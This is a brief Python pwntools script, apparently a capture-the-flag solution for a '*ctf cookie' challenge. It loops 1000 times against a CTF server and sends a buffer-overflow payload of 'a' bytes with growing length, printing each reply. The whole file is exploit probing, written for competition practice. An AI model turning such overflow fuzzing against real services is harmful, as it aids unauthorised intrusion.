#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
 to solve *ctf cookie
"""

from pwn import *

#r = remote("pwn.sixstars.team",22006)


payload = 'a'*0x4c + 'a'*4

for i in range(1000):
    ri = remote("pwn.sixstars.team", 22006)
    ri.recv()
    ri.sendline(payload + 'a'*i)
    print i
    w=ri.recv()
    print w
    ri.close()
